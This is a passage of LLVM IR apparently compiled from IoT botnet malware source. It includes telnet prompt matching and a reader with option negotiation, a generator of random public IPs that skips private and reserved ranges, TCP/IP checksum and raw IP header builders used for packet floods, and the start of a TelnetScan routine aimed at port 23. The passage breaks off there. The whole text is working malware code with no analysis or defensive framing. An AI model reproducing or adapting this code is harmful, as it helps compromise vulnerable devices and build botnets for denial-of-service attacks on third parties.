  %23 = trunc i64 %indvars.iv.1 to i32
  switch i8 %22, label %.critedge.1.loopexit [
    i8 0, label %.critedge1.1
    i8 32, label %.critedge1.1
    i8 13, label %.critedge1.1
    i8 10, label %.critedge1.1
  ]

.critedge1.1:                                     ; preds = %.lr.ph.1, %.lr.ph.1, %.lr.ph.1, %.lr.ph.1
  %indvars.iv.next.1 = add nsw i64 %indvars.iv.1, 1
  %24 = add nsw i32 %.130.1, 1
  %25 = icmp sgt i64 %5, %indvars.iv.next.1
  br i1 %25, label %.lr.ph.1, label %.critedge.1.loopexit

.critedge.1.loopexit:                             ; preds = %.critedge1.1, %.lr.ph.1
  %.1.lcssa.1.ph = phi i32 [ %23, %.lr.ph.1 ], [ %24, %.critedge1.1 ]
  br label %.critedge.1

.critedge.1:                                      ; preds = %.critedge.1.loopexit, %.preheader.137
  %.1.lcssa.1 = phi i32 [ %.1.lcssa, %.preheader.137 ], [ %.1.lcssa.1.ph, %.critedge.1.loopexit ]
  %26 = sext i32 %.1.lcssa.1 to i64
  %27 = sub nsw i64 0, %26
  %28 = getelementptr inbounds i8, i8* %4, i64 %27
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 62
  br i1 %30, label %19, label %.preheader.238

.preheader.238:                                   ; preds = %.critedge.1
  %31 = icmp sgt i32 %2, %.1.lcssa.1
  br i1 %31, label %.lr.ph.2.preheader, label %.critedge.2

.lr.ph.2.preheader:                               ; preds = %.preheader.238
  br label %.lr.ph.2

.lr.ph.2:                                         ; preds = %.lr.ph.2.preheader, %.critedge1.2
  %indvars.iv.2 = phi i64 [ %indvars.iv.next.2, %.critedge1.2 ], [ %26, %.lr.ph.2.preheader ]
  %.130.2 = phi i32 [ %36, %.critedge1.2 ], [ %.1.lcssa.1, %.lr.ph.2.preheader ]
  %32 = sub nsw i64 0, %indvars.iv.2
  %33 = getelementptr inbounds i8, i8* %4, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = trunc i64 %indvars.iv.2 to i32
  switch i8 %34, label %.critedge.2.loopexit [
    i8 0, label %.critedge1.2
    i8 32, label %.critedge1.2
    i8 13, label %.critedge1.2
    i8 10, label %.critedge1.2
  ]

.critedge1.2:                                     ; preds = %.lr.ph.2, %.lr.ph.2, %.lr.ph.2, %.lr.ph.2
  %indvars.iv.next.2 = add nsw i64 %indvars.iv.2, 1
  %36 = add nsw i32 %.130.2, 1
  %37 = icmp sgt i64 %5, %indvars.iv.next.2
  br i1 %37, label %.lr.ph.2, label %.critedge.2.loopexit

.critedge.2.loopexit:                             ; preds = %.critedge1.2, %.lr.ph.2
  %.1.lcssa.2.ph = phi i32 [ %35, %.lr.ph.2 ], [ %36, %.critedge1.2 ]
  br label %.critedge.2

.critedge.2:                                      ; preds = %.critedge.2.loopexit, %.preheader.238
  %.1.lcssa.2 = phi i32 [ %.1.lcssa.1, %.preheader.238 ], [ %.1.lcssa.2.ph, %.critedge.2.loopexit ]
  %38 = sext i32 %.1.lcssa.2 to i64
  %39 = sub nsw i64 0, %38
  %40 = getelementptr inbounds i8, i8* %4, i64 %39
  %41 = load i8, i8* %40, align 1
  %42 = icmp eq i8 %41, 37
  br i1 %42, label %19, label %.preheader.339

.preheader.339:                                   ; preds = %.critedge.2
  %43 = icmp sgt i32 %2, %.1.lcssa.2
  br i1 %43, label %.lr.ph.3.preheader, label %.critedge.3

.lr.ph.3.preheader:                               ; preds = %.preheader.339
  br label %.lr.ph.3

.lr.ph.3:                                         ; preds = %.lr.ph.3.preheader, %.critedge1.3
  %indvars.iv.3 = phi i64 [ %indvars.iv.next.3, %.critedge1.3 ], [ %38, %.lr.ph.3.preheader ]
  %.130.3 = phi i32 [ %48, %.critedge1.3 ], [ %.1.lcssa.2, %.lr.ph.3.preheader ]
  %44 = sub nsw i64 0, %indvars.iv.3
  %45 = getelementptr inbounds i8, i8* %4, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = trunc i64 %indvars.iv.3 to i32
  switch i8 %46, label %.critedge.3.loopexit [
    i8 0, label %.critedge1.3
    i8 32, label %.critedge1.3
    i8 13, label %.critedge1.3
    i8 10, label %.critedge1.3
  ]

.critedge1.3:                                     ; preds = %.lr.ph.3, %.lr.ph.3, %.lr.ph.3, %.lr.ph.3
  %indvars.iv.next.3 = add nsw i64 %indvars.iv.3, 1
  %48 = add nsw i32 %.130.3, 1
  %49 = icmp sgt i64 %5, %indvars.iv.next.3
  br i1 %49, label %.lr.ph.3, label %.critedge.3.loopexit

.critedge.3.loopexit:                             ; preds = %.critedge1.3, %.lr.ph.3
  %.1.lcssa.3.ph = phi i32 [ %47, %.lr.ph.3 ], [ %48, %.critedge1.3 ]
  br label %.critedge.3

.critedge.3:                                      ; preds = %.critedge.3.loopexit, %.preheader.339
  %.1.lcssa.3 = phi i32 [ %.1.lcssa.2, %.preheader.339 ], [ %.1.lcssa.3.ph, %.critedge.3.loopexit ]
  %50 = sext i32 %.1.lcssa.3 to i64
  %51 = sub nsw i64 0, %50
  %52 = getelementptr inbounds i8, i8* %4, i64 %51
  %53 = load i8, i8* %52, align 1
  %54 = icmp eq i8 %53, 36
  br i1 %54, label %19, label %.preheader.440

.preheader.440:                                   ; preds = %.critedge.3
  %55 = icmp sgt i32 %2, %.1.lcssa.3
  br i1 %55, label %.lr.ph.4.preheader, label %.critedge.4

.lr.ph.4.preheader:                               ; preds = %.preheader.440
  br label %.lr.ph.4

.lr.ph.4:                                         ; preds = %.lr.ph.4.preheader, %.critedge1.4
  %indvars.iv.4 = phi i64 [ %indvars.iv.next.4, %.critedge1.4 ], [ %50, %.lr.ph.4.preheader ]
  %.130.4 = phi i32 [ %60, %.critedge1.4 ], [ %.1.lcssa.3, %.lr.ph.4.preheader ]
  %56 = sub nsw i64 0, %indvars.iv.4
  %57 = getelementptr inbounds i8, i8* %4, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = trunc i64 %indvars.iv.4 to i32
  switch i8 %58, label %.critedge.4.loopexit [
    i8 0, label %.critedge1.4
    i8 32, label %.critedge1.4
    i8 13, label %.critedge1.4
    i8 10, label %.critedge1.4
  ]

.critedge1.4:                                     ; preds = %.lr.ph.4, %.lr.ph.4, %.lr.ph.4, %.lr.ph.4
  %indvars.iv.next.4 = add nsw i64 %indvars.iv.4, 1
  %60 = add nsw i32 %.130.4, 1
  %61 = icmp sgt i64 %5, %indvars.iv.next.4
  br i1 %61, label %.lr.ph.4, label %.critedge.4.loopexit

.critedge.4.loopexit:                             ; preds = %.critedge1.4, %.lr.ph.4
  %.1.lcssa.4.ph = phi i32 [ %59, %.lr.ph.4 ], [ %60, %.critedge1.4 ]
  br label %.critedge.4

.critedge.4:                                      ; preds = %.critedge.4.loopexit, %.preheader.440
  %.1.lcssa.4 = phi i32 [ %.1.lcssa.3, %.preheader.440 ], [ %.1.lcssa.4.ph, %.critedge.4.loopexit ]
  %62 = sext i32 %.1.lcssa.4 to i64
  %63 = sub nsw i64 0, %62
  %64 = getelementptr inbounds i8, i8* %4, i64 %63
  %65 = load i8, i8* %64, align 1
  %66 = icmp eq i8 %65, 35
  %. = zext i1 %66 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8* nocapture readonly, i32, i32, i32, i8*, i32, i32) local_unnamed_addr #1 {
  %9 = alloca %struct.__sigset_t, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = sext i32 %3 to i64
  %12 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i64 0, i32 0
  store i64 %11, i64* %12, align 8
  %13 = sext i32 %4 to i64
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i64 0, i32 1
  store i64 %13, i64* %14, align 8
  %15 = add nsw i32 %7, 2
  %16 = icmp slt i32 %15, %6
  br i1 %16, label %.lr.ph, label %.critedge

.lr.ph:                                           ; preds = %8
  %17 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i64 0, i32 0, i64 0
  %18 = srem i32 %0, 64
  %19 = zext i32 %18 to i64
  %20 = shl i64 1, %19
  %21 = sdiv i32 %0, 64
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i64 0, i32 0, i64 %22
  %24 = add nsw i32 %0, 1
  %25 = icmp eq i32 %2, 0
  %26 = icmp sgt i32 %3, 0
  %27 = icmp sgt i32 %4, 0
  %28 = or i1 %26, %27
  br i1 %28, label %.lr.ph50.preheader, label %.critedge

.lr.ph50.preheader:                               ; preds = %.lr.ph
  br label %.lr.ph50

.lr.ph50:                                         ; preds = %.lr.ph50.preheader, %.backedge._crit_edge
  %.0333549 = phi i32 [ %40, %.backedge._crit_edge ], [ %7, %.lr.ph50.preheader ]
  %29 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %17) #3, !srcloc !15
  %30 = load i64, i64* %23, align 8
  %31 = or i64 %30, %20
  store i64 %31, i64* %23, align 8
  %32 = call i32 @select(i32 %24, %struct.__sigset_t* nonnull %9, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* nonnull %10) #3
  %33 = icmp slt i32 %32, 1
  br i1 %33, label %.critedge.loopexit, label %34

; <label>:34:                                     ; preds = %.lr.ph50
  %35 = sext i32 %.0333549 to i64
  %36 = getelementptr inbounds i8, i8* %5, i64 %35
  %37 = call i64 @recv(i32 %0, i8* %36, i64 1, i32 0) #3
  %38 = trunc i64 %37 to i32
  switch i32 %38, label %39 [
    i32 -1, label %.critedge.loopexit
    i32 0, label %.critedge.loopexit
  ]

; <label>:39:                                     ; preds = %34
  %40 = add nsw i32 %38, %.0333549
  %41 = load i8, i8* %36, align 1
  %42 = icmp eq i8 %41, -1
  br i1 %42, label %43, label %49

; <label>:43:                                     ; preds = %39
  %44 = getelementptr inbounds i8, i8* %36, i64 1
  %45 = call i64 @recv(i32 %0, i8* %44, i64 2, i32 0) #3
  %46 = trunc i64 %45 to i32
  switch i32 %46, label %47 [
    i32 -1, label %.critedge
    i32 0, label %.critedge
  ]

; <label>:47:                                     ; preds = %43
  %48 = call i32 @negotiate(i32 %0, i8* nonnull %36, i32 undef)
  br label %.critedge

; <label>:49:                                     ; preds = %39
  %50 = call i8* @strstr(i8* nonnull %5, i8* %1) #14
  %51 = icmp eq i8* %50, null
  br i1 %51, label %52, label %.critedge.loopexit

; <label>:52:                                     ; preds = %49
  br i1 %25, label %.backedge, label %58

.backedge:                                        ; preds = %52, %58
  %53 = add nsw i32 %40, 2
  %54 = icmp slt i32 %53, %6
  br i1 %54, label %.backedge._crit_edge, label %.critedge.loopexit

.backedge._crit_edge:                             ; preds = %.backedge
  %.pre = load i64, i64* %12, align 8
  %.pre48 = load i64, i64* %14, align 8
  %55 = icmp sgt i64 %.pre, 0
  %56 = icmp sgt i64 %.pre48, 0
  %57 = or i1 %55, %56
  br i1 %57, label %.lr.ph50, label %.critedge.loopexit

; <label>:58:                                     ; preds = %52
  %59 = call i32 @matchPrompt(i8* nonnull %5)
  %60 = icmp eq i32 %59, 0
  br i1 %60, label %.backedge, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %34, %34, %49, %58, %.lr.ph50, %.backedge._crit_edge, %.backedge
  %.0.ph = phi i32 [ 0, %34 ], [ 0, %34 ], [ 1, %49 ], [ 1, %58 ], [ 0, %.lr.ph50 ], [ 0, %.backedge._crit_edge ], [ 0, %.backedge ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.lr.ph, %8, %43, %43, %47
  %.0 = phi i32 [ 0, %47 ], [ 0, %43 ], [ 0, %43 ], [ 0, %8 ], [ 0, %.lr.ph ], [ %.0.ph, %.critedge.loopexit ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() local_unnamed_addr #1 {
  %1 = alloca [16 x i8], align 16
  %2 = alloca [16 x i8], align 16
  %3 = load i8, i8* @ipState.1, align 1
  %4 = icmp eq i8 %3, -1
  %5 = load i8, i8* @ipState.2, align 1
  %6 = icmp eq i8 %5, -1
  %or.cond = or i1 %4, %6
  %7 = load i8, i8* @ipState.3, align 1
  %8 = icmp eq i8 %7, -1
  %or.cond19 = or i1 %or.cond, %8
  %9 = load i8, i8* @ipState.4, align 1
  %10 = icmp eq i8 %9, -1
  %or.cond21 = or i1 %or.cond19, %10
  br i1 %or.cond21, label %.critedge.preheader, label %11

.critedge.preheader:                              ; preds = %0
  br label %.critedge

; <label>:11:                                     ; preds = %0
  %12 = add i8 %3, 1
  store i8 %12, i8* @ipState.1, align 1
  %13 = add i8 %5, 1
  store i8 %13, i8* @ipState.2, align 1
  %14 = add i8 %7, 1
  store i8 %14, i8* @ipState.3, align 1
  %15 = add i8 %9, 1
  store i8 %15, i8* @ipState.4, align 1
  %16 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %17 = zext i8 %12 to i32
  %18 = zext i8 %13 to i32
  %19 = zext i8 %14 to i32
  %20 = zext i8 %15 to i32
  %21 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %16, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.24, i64 0, i64 0), i32 %17, i32 %18, i32 %19, i32 %20)
  br label %77

.critedge:                                        ; preds = %.critedge.backedge, %.critedge.preheader
  %22 = tail call i32 @rand() #3
  %23 = srem i32 %22, 255
  %24 = trunc i32 %23 to i8
  store i8 %24, i8* @ipState.1, align 1
  %25 = tail call i32 @rand() #3
  %26 = srem i32 %25, 255
  %27 = trunc i32 %26 to i8
  store i8 %27, i8* @ipState.2, align 1
  %28 = tail call i32 @rand() #3
  %29 = srem i32 %28, 255
  %30 = trunc i32 %29 to i8
  store i8 %30, i8* @ipState.3, align 1
  %31 = tail call i32 @rand() #3
  %32 = srem i32 %31, 255
  %33 = trunc i32 %32 to i8
  store i8 %33, i8* @ipState.4, align 1
  %34 = load i8, i8* @ipState.1, align 1
  switch i8 %34, label %42 [
    i8 0, label %.critedge.backedge
    i8 10, label %.critedge.backedge
    i8 100, label %35
    i8 127, label %.critedge.backedge
    i8 -87, label %39
  ]

.critedge.backedge:                               ; preds = %.critedge, %.critedge, %.critedge, %39, %35, %42, %47, %52, %63, %66, %60
  br label %.critedge

; <label>:35:                                     ; preds = %.critedge
  %36 = load i8, i8* @ipState.2, align 1
  %37 = icmp ugt i8 %36, 63
  %38 = icmp sgt i8 %36, -1
  %or.cond22 = and i1 %37, %38
  br i1 %or.cond22, label %.critedge.backedge, label %.thread51

.thread51:                                        ; preds = %35
  %.pre52 = load i8, i8* @ipState.2, align 1
  br label %.thread54

; <label>:39:                                     ; preds = %.critedge
  %40 = load i8, i8* @ipState.2, align 1
  %41 = icmp eq i8 %40, -2
  br i1 %41, label %.critedge.backedge, label %.thread54

; <label>:42:                                     ; preds = %.critedge
  %.pre = load i8, i8* @ipState.2, align 1
  %43 = icmp eq i8 %34, -84
  %44 = icmp ult i8 %.pre, 17
  %or.cond24 = and i1 %43, %44
  br i1 %or.cond24, label %.critedge.backedge, label %47

.thread54:                                        ; preds = %.thread51, %39
  %.ph = phi i8 [ %.pre52, %.thread51 ], [ %40, %39 ]
  %45 = icmp eq i8 %.ph, 0
  %46 = load i8, i8* @ipState.3, align 1
  br label %52

; <label>:47:                                     ; preds = %42
  %48 = icmp eq i8 %34, -64
  %49 = icmp eq i8 %.pre, 0
  %or.cond26 = and i1 %48, %49
  %50 = load i8, i8* @ipState.3, align 1
  %51 = icmp eq i8 %50, 2
  %or.cond28 = and i1 %or.cond26, %51
  br i1 %or.cond28, label %.critedge.backedge, label %52

; <label>:52:                                     ; preds = %.thread54, %47
  %53 = phi i8 [ %46, %.thread54 ], [ %50, %47 ]
  %54 = phi i1 [ %45, %.thread54 ], [ %49, %47 ]
  %55 = phi i1 [ false, %.thread54 ], [ %48, %47 ]
  %56 = phi i8 [ %.ph, %.thread54 ], [ %.pre, %47 ]
  %57 = icmp eq i8 %56, 88
  %or.cond30 = and i1 %55, %57
  %58 = icmp eq i8 %53, 99
  %or.cond32 = and i1 %or.cond30, %58
  %59 = icmp eq i8 %56, -88
  %or.cond34 = and i1 %55, %59
  %or.cond43 = or i1 %or.cond34, %or.cond32
  br i1 %or.cond43, label %.critedge.backedge, label %60

; <label>:60:                                     ; preds = %52
  %61 = icmp eq i8 %34, -58
  %62 = and i8 %56, -2
  %switch = icmp eq i8 %62, 18
  %or.cond44 = and i1 %61, %switch
  br i1 %or.cond44, label %.critedge.backedge, label %63

; <label>:63:                                     ; preds = %60
  %64 = icmp eq i8 %56, 51
  %or.cond36 = and i1 %61, %64
  %65 = icmp eq i8 %53, 100
  %or.cond38 = and i1 %or.cond36, %65
  br i1 %or.cond38, label %.critedge.backedge, label %66

; <label>:66:                                     ; preds = %63
  %67 = icmp eq i8 %34, -53
  %or.cond40 = and i1 %67, %54
  %68 = icmp eq i8 %53, 113
  %or.cond42 = and i1 %or.cond40, %68
  %69 = icmp ugt i8 %34, -33
  %or.cond45 = or i1 %69, %or.cond42
  br i1 %or.cond45, label %.critedge.backedge, label %70

; <label>:70:                                     ; preds = %66
  %71 = zext i8 %34 to i32
  %72 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i64 0, i64 0
  %73 = zext i8 %56 to i32
  %74 = zext i8 %53 to i32
  %75 = and i32 %32, 255
  %76 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %72, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.24, i64 0, i64 0), i32 %71, i32 %73, i32 %74, i32 %75)
  br label %77

; <label>:77:                                     ; preds = %70, %11
  %.sink = phi i8* [ %72, %70 ], [ %16, %11 ]
  %78 = call i32 @inet_addr(i8* %.sink) #3
  ret i32 %78
}

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) local_unnamed_addr #1 {
  %2 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %3 = tail call i32 @ntohl(i32 %2) #17
  %4 = and i32 %3, %0
  %5 = tail call i32 @rand_cmwc()
  %6 = xor i32 %0, -1
  %7 = and i32 %5, %6
  %8 = xor i32 %7, %4
  ret i32 %8
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #9

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @csum(i16* nocapture readonly, i32) local_unnamed_addr #10 {
  %3 = icmp sgt i32 %1, 1
  br i1 %3, label %.lr.ph16.preheader, label %._crit_edge17

.lr.ph16.preheader:                               ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %addconv33 = add nuw i32 %5, 1
  %min.iters.check = icmp ult i32 %addconv33, 4
  br i1 %min.iters.check, label %.lr.ph16.preheader34, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph16.preheader
  %8 = zext i32 %addconv33 to i64
  %9 = and i32 %addconv33, 3
  %n.mod.vf = zext i32 %9 to i64
  %n.vec = sub nsw i64 %8, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  %cast.crd = trunc i64 %n.vec to i32
  %10 = shl i32 %cast.crd, 1
  %ind.end = sub i32 %1, %10
  %ind.end27 = getelementptr i16, i16* %0, i64 %n.vec
  br i1 %cmp.zero, label %.lr.ph16.preheader34, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %vector.body
  %index = phi i64 [ %index.next, %vector.body ], [ 0, %vector.body.preheader ]
  %vec.phi = phi <2 x i64> [ %16, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %vec.phi28 = phi <2 x i64> [ %17, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %next.gep = getelementptr i16, i16* %0, i64 %index
  %11 = bitcast i16* %next.gep to <2 x i16>*
  %wide.load = load <2 x i16>, <2 x i16>* %11, align 2
  %12 = getelementptr i16, i16* %next.gep, i64 2
  %13 = bitcast i16* %12 to <2 x i16>*
  %wide.load31 = load <2 x i16>, <2 x i16>* %13, align 2
  %14 = zext <2 x i16> %wide.load to <2 x i64>
  %15 = zext <2 x i16> %wide.load31 to <2 x i64>
  %16 = add <2 x i64> %14, %vec.phi
  %17 = add <2 x i64> %15, %vec.phi28
  %index.next = add i64 %index, 4
  %18 = icmp eq i64 %index.next, %n.vec
  br i1 %18, label %middle.block, label %vector.body, !llvm.loop !16

middle.block:                                     ; preds = %vector.body
  %bin.rdx = add <2 x i64> %17, %16
  %rdx.shuf = shufflevector <2 x i64> %bin.rdx, <2 x i64> undef, <2 x i32> <i32 1, i32 undef>
  %bin.rdx32 = add <2 x i64> %bin.rdx, %rdx.shuf
  %19 = extractelement <2 x i64> %bin.rdx32, i32 0
  %cmp.n = icmp eq i32 %9, 0
  br i1 %cmp.n, label %._crit_edge17.loopexit, label %.lr.ph16.preheader34

.lr.ph16.preheader34:                             ; preds = %middle.block, %min.iters.checked, %.lr.ph16.preheader
  %.014.ph = phi i64 [ 0, %min.iters.checked ], [ 0, %.lr.ph16.preheader ], [ %19, %middle.block ]
  %.0913.ph = phi i32 [ %1, %min.iters.checked ], [ %1, %.lr.ph16.preheader ], [ %ind.end, %middle.block ]
  %.01012.ph = phi i16* [ %0, %min.iters.checked ], [ %0, %.lr.ph16.preheader ], [ %ind.end27, %middle.block ]
  br label %.lr.ph16

.lr.ph16:                                         ; preds = %.lr.ph16.preheader34, %.lr.ph16
  %.014 = phi i64 [ %23, %.lr.ph16 ], [ %.014.ph, %.lr.ph16.preheader34 ]
  %.0913 = phi i32 [ %24, %.lr.ph16 ], [ %.0913.ph, %.lr.ph16.preheader34 ]
  %.01012 = phi i16* [ %20, %.lr.ph16 ], [ %.01012.ph, %.lr.ph16.preheader34 ]
  %20 = getelementptr inbounds i16, i16* %.01012, i64 1
  %21 = load i16, i16* %.01012, align 2
  %22 = zext i16 %21 to i64
  %23 = add i64 %22, %.014
  %24 = add nsw i32 %.0913, -2
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %.lr.ph16, label %._crit_edge17.loopexit.loopexit, !llvm.loop !17

._crit_edge17.loopexit.loopexit:                  ; preds = %.lr.ph16
  br label %._crit_edge17.loopexit

._crit_edge17.loopexit:                           ; preds = %._crit_edge17.loopexit.loopexit, %middle.block
  %.lcssa25 = phi i64 [ %19, %middle.block ], [ %23, %._crit_edge17.loopexit.loopexit ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %26 = sub i32 %4, %7
  br label %._crit_edge17

._crit_edge17:                                    ; preds = %._crit_edge17.loopexit, %2
  %.010.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge17.loopexit ]
  %.09.lcssa = phi i32 [ %1, %2 ], [ %26, %._crit_edge17.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa25, %._crit_edge17.loopexit ]
  %27 = icmp eq i32 %.09.lcssa, 1
  br i1 %27, label %28, label %.preheader

; <label>:28:                                     ; preds = %._crit_edge17
  %29 = bitcast i16* %.010.lcssa to i8*
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i64
  %32 = add i64 %31, %.0.lcssa
  br label %.preheader

.preheader:                                       ; preds = %28, %._crit_edge17
  %.1.ph = phi i64 [ %.0.lcssa, %._crit_edge17 ], [ %32, %28 ]
  %33 = lshr i64 %.1.ph, 16
  %34 = icmp eq i64 %33, 0
  br i1 %34, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %35 = phi i64 [ %38, %.lr.ph ], [ %33, %.lr.ph.preheader ]
  %.111 = phi i64 [ %37, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %36 = and i64 %.111, 65535
  %37 = add nuw nsw i64 %36, %35
  %38 = lshr i64 %37, 16
  %39 = icmp eq i64 %38, 0
  br i1 %39, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.1.lcssa = phi i64 [ %.1.ph, %.preheader ], [ %37, %._crit_edge.loopexit ]
  %40 = trunc i64 %.1.lcssa to i16
  %41 = xor i16 %40, -1
  ret i16 %41
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr* nocapture readonly, %struct.tcphdr* nocapture readonly) local_unnamed_addr #1 {
  %3 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %4 = bitcast i32* %3 to <2 x i32>*
  %5 = load <2 x i32>, <2 x i32>* %4, align 4
  %6 = zext <2 x i32> %5 to <2 x i64>
  %7 = tail call zeroext i16 @htons(i16 zeroext 20) #17
  %8 = tail call noalias i8* @malloc(i64 44) #3
  %9 = bitcast i8* %8 to i16*
  %10 = bitcast i8* %8 to <2 x i64>*
  store <2 x i64> %6, <2 x i64>* %10, align 1
  %.sroa.3.0..sroa_idx = getelementptr inbounds i8, i8* %8, i64 16
  store i8 0, i8* %.sroa.3.0..sroa_idx, align 1
  %.sroa.4.0..sroa_raw_idx = getelementptr inbounds i8, i8* %8, i64 17
  store i8 6, i8* %.sroa.4.0..sroa_raw_idx, align 1
  %.sroa.5.0..sroa_idx7 = getelementptr inbounds i8, i8* %8, i64 18
  %11 = bitcast i8* %.sroa.5.0..sroa_idx7 to i16*
  store i16 %7, i16* %11, align 1
  %12 = getelementptr inbounds i8, i8* %8, i64 24
  %13 = bitcast %struct.tcphdr* %1 to i8*
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %12, i8* %13, i64 20, i32 1, i1 false)
  %14 = tail call zeroext i16 @csum(i16* %9, i32 44)
  tail call void @free(i8* %8) #3
  ret i16 %14
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #6

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeIPPacket(%struct.iphdr* nocapture, i32, i32, i8 zeroext, i32) local_unnamed_addr #0 {
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 0
  store i8 69, i8* %6, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 1
  store i8 0, i8* %7, align 1
  %8 = trunc i32 %4 to i16
  %9 = add i16 %8, 20
  %10 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 2
  store i16 %9, i16* %10, align 2
  %11 = tail call i32 @rand_cmwc()
  %12 = trunc i32 %11 to i16
  %13 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 3
  store i16 %12, i16* %13, align 4
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 4
  store i16 0, i16* %14, align 2
  %15 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 5
  store i8 -1, i8* %15, align 4
  %16 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  store i8 %3, i8* %16, align 1
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 7
  store i16 0, i16* %17, align 2
  %18 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  store i32 %2, i32* %18, align 4
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  store i32 %1, i32* %19, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) local_unnamed_addr #1 {
  %2 = icmp slt i32 %0, 3
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %1
  %4 = tail call i32 @close(i32 %0) #3
  br label %5

; <label>:5:                                      ; preds = %1, %3
  %.0 = phi i32 [ 0, %3 ], [ 1, %1 ]
  ret i32 %.0
}

; Function Attrs: noinline noreturn nounwind uwtable
define void @TelnetScan() local_unnamed_addr #12 {
  %1 = alloca %struct.__sigset_t, align 8
  %2 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %2 to %struct.timeval*
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = tail call i32 @getdtablesize() #3
  %7 = sdiv i32 %6, 4
  %8 = mul nsw i32 %7, 3
  %9 = icmp slt i32 %8, 512
  %10 = select i1 %9, i32 %8, i32 512
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = tail call zeroext i16 @htons(i16 zeroext 23) #17
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %12, i16* %13, align 2
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %15 = bitcast i8* %14 to i64*
  store i64 0, i64* %15, align 4
  %16 = zext i32 %10 to i64
  %17 = alloca %struct.telstate_t, i64 %16, align 16
  %18 = bitcast %struct.telstate_t* %17 to i8*
  %19 = sext i32 %10 to i64
  %20 = mul nsw i64 %19, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %18, i8 0, i64 %20, i32 16, i1 false)
  %21 = icmp sgt i32 %6, 3
  br i1 %21, label %.lr.ph309.preheader, label %.preheader

.lr.ph309.preheader:                              ; preds = %0
  br label %.lr.ph309
